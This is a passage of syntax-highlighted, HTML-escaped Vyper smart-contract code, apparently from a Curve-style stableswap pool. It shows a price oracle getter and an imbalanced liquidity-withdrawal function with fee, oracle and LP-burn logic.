&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;price_oracle&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint256:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_calc_moving_average&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;last_prices_packed[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;ma_exp_time&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;ma_last_time &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;amp; &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;**&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;128 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    )
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;external
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;@&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;nonreentrant&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;lock&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;remove_liquidity_imbalance&lt;&#x2F;span&gt;&lt;span&gt;(
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;_amounts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;DynArray[uint256, MAX_COINS]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;_max_burn_amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;,
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;_receiver&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;address &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender
&lt;&#x2F;span&gt;&lt;span&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;-&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;uint256:
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;&amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    @notice Withdraw coins from the pool in an imbalanced amount
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    @param _amounts List of amounts of underlying coins to withdraw
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    @param _max_burn_amount Maximum amount of LP token to burn in the withdrawal
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    @param _receiver Address that receives the withdrawn coins
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    @return Actual amount of the LP token burned in the withdrawal
&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;    &amp;quot;&amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    amp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_A&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    rates&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;DynArray[uint256, MAX_COINS] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_stored_rates&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    old_balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;DynArray[uint256, MAX_COINS] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_balances&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;    D0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;get_D_mem&lt;&#x2F;span&gt;&lt;span&gt;(rates&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;old_balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amp)
&lt;&#x2F;span&gt;&lt;span&gt;    new_balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;DynArray[uint256, MAX_COINS] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;old_balances
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(MAX_COINS_128):
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;N_COINS_128:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;_amounts[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            new_balances[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;_amounts[i]
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_transfer_out&lt;&#x2F;span&gt;&lt;span&gt;(i&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_amounts[i]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_receiver)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    D1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;get_D_mem&lt;&#x2F;span&gt;&lt;span&gt;(rates&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;new_balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amp)
&lt;&#x2F;span&gt;&lt;span&gt;    base_fee&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;fee &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;N_COINS &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;4 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(N_COINS &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;))
&lt;&#x2F;span&gt;&lt;span&gt;    ys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;(D0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;D1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;N_COINS
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    fees&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;DynArray[uint256, MAX_COINS] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;empty&lt;&#x2F;span&gt;&lt;span&gt;(DynArray[uint256, MAX_COINS])
&lt;&#x2F;span&gt;&lt;span&gt;    dynamic_fee&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    xs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    ideal_balance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    difference&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;    new_balance&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;for &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;range&lt;&#x2F;span&gt;&lt;span&gt;(MAX_COINS_128):
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;i &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;N_COINS_128:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        ideal_balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;D1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;old_balances[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;D0
&lt;&#x2F;span&gt;&lt;span&gt;        difference &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0
&lt;&#x2F;span&gt;&lt;span&gt;        new_balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;new_balances[i]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;ideal_balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;new_balance:
&lt;&#x2F;span&gt;&lt;span&gt;            difference &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;ideal_balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;new_balance
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            difference &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;new_balance &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;ideal_balance
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        xs &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;unsafe_div&lt;&#x2F;span&gt;&lt;span&gt;(rates[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;(old_balances[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;new_balance)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;PRECISION)
&lt;&#x2F;span&gt;&lt;span&gt;        dynamic_fee &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_dynamic_fee&lt;&#x2F;span&gt;&lt;span&gt;(xs&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;ys&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;base_fee)
&lt;&#x2F;span&gt;&lt;span&gt;        fees&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(dynamic_fee &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;difference &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;FEE_DENOMINATOR)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;admin_balances[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span&gt;fees[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;admin_fee &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;FEE_DENOMINATOR
&lt;&#x2F;span&gt;&lt;span&gt;        new_balances[i] &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;fees[i]
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    D1 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;get_D_mem&lt;&#x2F;span&gt;&lt;span&gt;(rates&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;new_balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amp)  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# dev: reuse D1 for new D.
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;upkeep_oracles&lt;&#x2F;span&gt;&lt;span&gt;(new_balances&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;amp&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;D1)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    total_supply&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;total_supply
&lt;&#x2F;span&gt;&lt;span&gt;    burn_amount&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;: &lt;&#x2F;span&gt;&lt;span&gt;uint256 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;((D0 &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;- &lt;&#x2F;span&gt;&lt;span&gt;D1) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;* &lt;&#x2F;span&gt;&lt;span&gt;total_supply &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&#x2F; &lt;&#x2F;span&gt;&lt;span&gt;D0) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;burn_amount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# dev: zero tokens burned
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;assert &lt;&#x2F;span&gt;&lt;span&gt;burn_amount &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt;= &lt;&#x2F;span&gt;&lt;span&gt;_max_burn_amount, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;Slippage screwed you&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    total_supply &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;-= &lt;&#x2F;span&gt;&lt;span&gt;burn_amount
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;_burnFrom&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;burn_amount)
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    log &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;RemoveLiquidityImbalance&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span&gt;sender&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;_amounts&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;fees&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;D1&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;total_supply)
&lt;&#x2F;span&gt;&lt;span&gt;
